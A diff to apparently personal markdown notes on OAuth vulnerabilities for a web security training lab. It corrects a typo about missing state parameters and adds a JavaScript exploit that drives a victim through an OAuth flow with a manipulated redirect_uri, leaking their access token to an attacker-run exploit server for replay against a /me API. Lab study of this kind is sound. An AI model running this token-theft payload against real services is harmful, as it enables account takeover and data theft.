@@ -34,7 +34,7 @@ These will often return a JSON configuration file containing key information, su
 
 **csrf related**
 
-Look for flows that do not send a `state` parmater, this opens up the flow to csrf possibilities
+Look for flows that do not send a `state` paramater, this opens up the flow to csrf possibilities
 
 **Redirect uri**
 
@@ -233,6 +233,9 @@ window.location = '/?'+document.location.hash.substr(1)
 ```
 
 - to test that it is working, store the exploit and visit your malicious URL again in the browser, then go tto the exploit server access log there should be a request for `GET /?access_token=[...]`
-- deliver the exploit to the victim, then copy their access token from the log
+- You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example
+```
+<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>
+```
 - in repeater go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied, send the request, and observe that you made an successful API call to fetch the victim's data
 
